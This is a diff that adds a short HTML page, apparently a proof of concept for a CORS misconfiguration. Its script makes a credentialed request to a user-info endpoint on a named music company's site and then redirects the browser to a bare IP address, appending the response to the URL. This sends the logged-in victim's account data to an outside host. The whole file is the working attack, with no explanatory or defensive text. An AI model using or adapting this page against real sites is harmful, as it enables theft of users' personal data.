@@ -1,0 +1,13 @@
+<!DOCTYPE>
+<html>
+<script type="text/javascript">
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open("get","https://institute.tencentmusic.com/auth/get_user_info",true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+location="//39.105.29.220/?response="+this.responseText;
+};
+</script>
+</html>
